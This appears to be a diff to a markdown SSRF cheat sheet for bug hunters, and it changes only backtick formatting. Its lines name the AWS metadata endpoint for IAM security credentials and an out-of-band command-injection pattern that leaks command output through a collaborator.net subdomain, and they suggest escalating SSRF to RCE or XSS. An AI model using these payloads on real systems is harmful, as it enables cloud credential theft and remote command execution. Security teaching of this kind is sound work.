@@ -34,7 +34,7 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
 ## Escalation
 
 * SSRF can be Escalated to RCE :) [Impact High] 
-* `<os cmd>`.collaborator.net (thehackerish has a good video in it :)
+* `` `<os cmd>` ``.collaborator.net (thehackerish has a good video in it :)
 * If there's no impact! on your SSRF rather than a redirect try to escalate it to XSS.
 
 ## Resources 💯
